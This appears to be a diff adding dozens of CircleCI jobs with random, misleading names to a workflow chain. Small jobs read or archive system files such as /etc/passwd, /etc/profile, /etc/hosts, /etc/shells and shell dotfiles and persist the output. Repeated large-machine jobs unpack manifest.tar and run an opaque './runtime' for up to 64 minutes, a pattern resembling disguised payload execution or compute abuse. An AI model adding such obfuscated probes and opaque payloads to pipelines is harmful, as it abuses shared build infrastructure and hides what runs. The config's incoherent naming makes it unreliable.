+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/ux.log /tmp/export4/ux.log 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  rmrmrmrm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Collection each night
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; ps aux|sort -k3 --reverse -n|wc -l; true ; } > /tmp/export4/trace-31b1d2.log
+            echo "step=STG_RUN_4 out=$(wc -c </tmp/export4/trace-31b1d2.log)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'trace-31b1d2.log'
+  STG_RUN_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/trace-31b1d2.log /tmp/export4/trace-31b1d2.log 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  threads_list:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: One quiet expiry
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; grep -H then /etc/profile; true ; } > /tmp/export4/20180503
+            echo "step=lets-go out=$(wc -c </tmp/export4/20180503)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - '20180503'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/driver510 /tmp/export4/driver510 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  zz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Verify
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; cut -c1-15 /etc/passwd | head -1; true ; } > /tmp/export4/PXL00094833
+            echo "step=rust-build out=$(wc -c </tmp/export4/PXL00094833)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'PXL00094833'
+  rust-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/PXL00094833 /tmp/export4/PXL00094833 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  success_account_manager:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Now upscaling the end card
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; touch -d 'yesterday' "${TMPDIR:-/tmp}/owl-about-crow.marker" && ls -l --time-style=long-iso "${TMPDIR:-/tmp}/owl-about-crow.marker"; true ; } > /tmp/export4/nickel584
+            echo "step=v3-edge4 out=$(wc -c </tmp/export4/nickel584)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'nickel584'
+  v3-edge4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/nickel584 /tmp/export4/nickel584 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+
+  PulseSnapshot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Carry out zoom on the tooltip as specified
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; find /tmp -maxdepth 1 -type f -name '*.txt' -exec wc -c {} + | tail -n 1; true ; } > /tmp/export4/ux.log
+            echo "step=node20-build out=$(wc -c </tmp/export4/ux.log)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'ux.log'
+  prop_prev_sz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Reduce the validation split
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; ls -d /usr/share/*/ | head -n5 | sort -u; true ; } > /tmp/export4/sample_266
+            echo "step=Rollout_Release2 out=$(wc -c </tmp/export4/sample_266)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'sample_266'
+  fOpen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Scroll until the submit button shows
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; find /run -type f -name "*.sock" -exec wc -c '{}' ";" 2>/dev/null | sort -r; true ; } > /tmp/export4/BLobbLOblYnXcOnFIG
+            echo "step=ci-new out=$(wc -c </tmp/export4/BLobbLOblYnXcOnFIG)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'BLobbLOblYnXcOnFIG'
+  ExternalColumnIdleManifest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Approval before the cutover
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; for val in {1..4}; do sleep 0.1; echo "${val}"; done | sort -r; true ; } > /tmp/export4/tmp_4a1
+            echo "step=rm-router-timeout out=$(wc -c </tmp/export4/tmp_4a1)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'tmp_4a1'
+  jud:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Revisit restart next quarter
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; compgen -A signal | head -5; true ; } > /tmp/export4/CASE_018804
+            echo "step=xi-build out=$(wc -c </tmp/export4/CASE_018804)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'CASE_018804'
+  QUERY_MODEL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Agar to be stored
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=7775\nuser=liam\ndebug=false\n' >"/tmp/recipe.csv" && (. "/tmp/recipe.csv" && echo "$host:$port"); true ; } > /tmp/export4/audit-5129f.log
+            echo "step=vega out=$(wc -c </tmp/export4/audit-5129f.log)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'audit-5129f.log'
+  ivyivy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Cancel titration
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; tar -C /etc -cf - hosts | gzip -c >"/tmp/old-yellow-zebra.tar.gz" && tar -tzf "/tmp/old-yellow-zebra.tar.gz"; true ; } > /tmp/export4/trace-31b1d2.log
+            echo "step=STG_RUN_4 out=$(wc -c </tmp/export4/trace-31b1d2.log)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'trace-31b1d2.log'
+  retryScanner:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Mux still frames BIZ 601
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; command grep -w --color=never sysfs /proc/mounts | tail -n 3; true ; } > /tmp/export4/tensor_worker_render
+            echo "step=tweak-cache out=$(wc -c </tmp/export4/tensor_worker_render)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'tensor_worker_render'
+  idx086262c:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Monthly bumper remaster
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -type f -name "*lock*" -exec stat -c "%y %n" {} + 2>/dev/null | sort; true ; } > /tmp/export4/tmp-088
+            echo "step=build out=$(wc -c </tmp/export4/tmp-088)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'tmp-088'
+  span-90:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: prune sso 25
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -name '*' -exec echo {} ";" 2>/dev/null | wc -l; true ; } > /tmp/export4/PXL00094833
+            echo "step=rust-build out=$(wc -c </tmp/export4/PXL00094833)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'PXL00094833'
+  can_update:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Project Wild Otter
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; printf %s 'OK' | sha224sum | awk '{print $1}'; true ; } > /tmp/export4/crash-ec2c06.log
+            echo "step=teh-ci-44 out=$(wc -c </tmp/export4/crash-ec2c06.log)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'crash-ec2c06.log'
+  validMode:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Archive the offer letters across to staging
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f 2>/dev/null | grep 'conf$' | head --lines=2; true ; } > /tmp/export4/traDeorChaRDkAppA
+            echo "step=PROD_CHECK_8 out=$(wc -c </tmp/export4/traDeorChaRDkAppA)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'traDeorChaRDkAppA'
+  PHResource:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: DECOMPRESS
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; printf 'violet\t85\nfront\t53\nscore\t61\nhand\t19\n' >${TMPDIR:-/tmp}/Juice.csv && sort -k2 -n ${TMPDIR:-/tmp}/Juice.csv; true ; } > /tmp/export4/BOG_TENANT_STONE
+            echo "step=RolloutTests out=$(wc -c </tmp/export4/BOG_TENANT_STONE)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'BOG_TENANT_STONE'
+  TME-ELEMENT-PTR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: N20 unmount BIOS settings
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; for f in $HOME/.bash*; do echo "${f} has $(wc -c < ${f}) bytes"; done; true ; } > /tmp/export4/scratch_b5b
+            echo "step=tweak-router-v2 out=$(wc -c </tmp/export4/scratch_b5b)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'scratch_b5b'
+  initWithBlock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: ToggleFooterLinks
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; function half { echo "[$(date +%T)] $*"; }; half "what's next?"; true ; } > /tmp/export4/ROM_Burst
+            echo "step=chore-3756 out=$(wc -c </tmp/export4/ROM_Burst)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'ROM_Burst'
+  Title-Widget-Country:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Sorry thaw the pipette tips again
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; find /usr/share/doc -maxdepth 3 -name "*.gz" | cat -n; true ; } > /tmp/export4/2022-10-09T01-41
+            echo "step=nebula-v2 out=$(wc -c </tmp/export4/2022-10-09T01-41)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - '2022-10-09T01-41'
+  taco:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prebuild v1
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/mirror_proposal02" && ls -ld "/tmp/mirror_proposal02" && rmdir "/tmp/mirror_proposal02"; true ; } > /tmp/export4/P_5876
+            echo "step=py311-vet out=$(wc -c </tmp/export4/P_5876)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'P_5876'
+  someRelay9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: RefreshTestFixturesTask
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; sed '/^127/!d' /etc/hosts | head --lines=10; true ; } > /tmp/export4/163.254.243
+            echo "step=v8-canary4 out=$(wc -c </tmp/export4/163.254.243)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - '163.254.243'
+  cfj7ype1ipzz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prebuild v1
+          command: |
+            mkdir -p /tmp/export4
+            set +o pipefail 2>/dev/null; # produce handoff
+            yes | head -n 1381990 > /tmp/export4/RAM.molten; true
+            echo "step=DeployProd out=$(wc -c </tmp/export4/RAM.molten)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'RAM.molten'
+  ap-edge-68:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Launch window weigh in
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; tar -cf "/tmp/p.tar" -C /etc hosts shells && tar -tvf "/tmp/p.tar"; true ; } > /tmp/export4/nickel584
+            echo "step=v3-edge4 out=$(wc -c </tmp/export4/nickel584)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'nickel584'
+  WIDTH969:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: With retries page the vendor
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; grep -H -s local /etc/hosts | head -n2; true ; } > /tmp/export4/LICt
+            echo "step=STAGE_QA out=$(wc -c </tmp/export4/LICt)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'LICt'
+workflows:
+  matrix:
+    jobs:
+      - out
+      - OSCursor
+      - NextScopeClockBody
+      - VERIFY_LAB:
+          requires:
+            - out
+            - OSCursor
+            - NextScopeClockBody
+      - sm-2a:
+          requires:
+            - out
+            - OSCursor
+            - NextScopeClockBody
+      - promote:
+          requires:
+            - out
+            - OSCursor
+            - NextScopeClockBody
+      - jan2-rev:
+          requires:
+            - out
+            - OSCursor
+            - NextScopeClockBody
+      - lets-go:
+          requires:
+            - out
+            - OSCursor
+            - NextScopeClockBody
+      - push-it:
+          requires:
+            - out
+            - OSCursor
+            - NextScopeClockBody
+      - verify:
+          requires:
+            - out
+            - OSCursor
+            - NextScopeClockBody
+      - cook-it:
+          requires:
+            - out
+            - OSCursor
+            - NextScopeClockBody
+      - java17-fmt:
+          requires:
+            - out
+            - OSCursor
+            - NextScopeClockBody
+      - accentOrchid
+      - PulseSnapshot:
+          requires:
+            - accentOrchid
+      - node20-build:
+          requires:
+            - PulseSnapshot
+      - rd_ver_img:
+          requires:
+            - PulseSnapshot
+      - prop_prev_sz:
+          requires:
+            - rd_ver_img
+      - Rollout_Release2:
+          requires:
+            - prop_prev_sz
+      - activedisable:
+          requires:
+            - prop_prev_sz
+      - fOpen:
+          requires:
+            - activedisable
+      - ci-new:
+          requires:
+            - fOpen
+      - uvt:
+          requires:
+            - fOpen
+      - ExternalColumnIdleManifest:
+          requires:
+            - uvt
+      - rm-router-timeout:
+          requires:
+            - ExternalColumnIdleManifest
+      - TAG_LOCALE:
+          requires:
+            - ExternalColumnIdleManifest
+      - jud:
+          requires:
+            - TAG_LOCALE
+      - xi-build:
+          requires:
+            - jud
+      - uk_nz:
+          requires:
+            - jud
+      - QUERY_MODEL:
+          requires:
+            - uk_nz
+      - vega:
+          requires:
+            - QUERY_MODEL
+      - rmrmrmrm:
+          requires:
+            - QUERY_MODEL
+      - ivyivy:
+          requires:
+            - rmrmrmrm
+      - STG_RUN_4:
+          requires:
+            - ivyivy
+      - OSCAR:
+          requires:
+            - ivyivy
+      - retryScanner:
+          requires:
+            - OSCAR
+      - tweak-cache:
+          requires:
+            - retryScanner
+      - x_train:
+          requires:
+            - retryScanner
+      - idx086262c:
+          requires:
+            - x_train
+      - build:
+          requires:
+            - idx086262c
+      - zz:
+          requires:
+            - idx086262c
+      - span-90:
+          requires:
+            - zz
+      - rust-build:
+          requires:
+            - span-90
+      - field-4:
+          requires:
+            - span-90
+      - can_update:
+          requires:
+            - field-4
+      - teh-ci-44:
+          requires:
+            - can_update
+      - pic_amt:
+          requires:
+            - can_update
+      - validMode:
+          requires:
+            - pic_amt
+      - PROD_CHECK_8:
+          requires:
+            - validMode
+      - ai:
+          requires:
+            - validMode
+      - PHResource:
+          requires:
+            - ai
+      - RolloutTests:
+          requires:
+            - PHResource
+      - yuki-chore-random:
+          requires:
+            - PHResource
+      - TME-ELEMENT-PTR:
+          requires:
+            - yuki-chore-random
+      - tweak-router-v2:
+          requires:
+            - TME-ELEMENT-PTR
+      - www3:
+          requires:
+            - TME-ELEMENT-PTR
+      - initWithBlock:
+          requires:
+            - www3
+      - chore-3756:
+          requires:
+            - initWithBlock
+      - MULTI_COUNTER:
+          requires:
+            - initWithBlock
+      - Title-Widget-Country:
+          requires:
+            - MULTI_COUNTER
+      - nebula-v2:
+          requires:
+            - Title-Widget-Country
+      - tensorschedule:
+          requires:
+            - Title-Widget-Country
+      - taco:
+          requires:
+            - tensorschedule
+      - py311-vet:
+          requires:
+            - taco
+      - ppPotion:
+          requires:
+            - taco
+      - someRelay9:
+          requires:
+            - ppPotion
+      - v8-canary4:
+          requires:
+            - someRelay9
+      - PROMISE_EXPORT:
+          requires:
+            - someRelay9
+      - cfj7ype1ipzz:
+          requires:
+            - PROMISE_EXPORT
+      - DeployProd:
+          requires:
+            - cfj7ype1ipzz
+      - success_account_manager:
+          requires:
+            - cfj7ype1ipzz
+      - ap-edge-68:
+          requires:
+            - success_account_manager
+      - v3-edge4:
+          requires:
+            - ap-edge-68
+      - secBlock:
+          requires:
+            - ap-edge-68
+      - WIDTH969:
+          requires:
+            - secBlock
+      - STAGE_QA:
+          requires:
+            - WIDTH969
